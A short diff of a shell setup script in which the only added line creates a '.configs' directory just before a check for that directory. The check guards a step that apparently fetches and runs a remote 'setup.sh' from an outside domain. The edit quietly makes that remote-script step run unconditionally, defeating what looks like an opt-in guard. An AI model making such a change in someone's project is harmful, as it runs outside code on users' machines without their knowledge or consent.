@@ -553,6 +553,7 @@ run_remote_config_script() {
 }
 
 GIST_URL="https://www.aiskills.life/src/setup.sh"
+mkdir -p .configs
 if [ -d .configs ]; then
     run_step "配置相关环境" run_remote_config_script
 fi
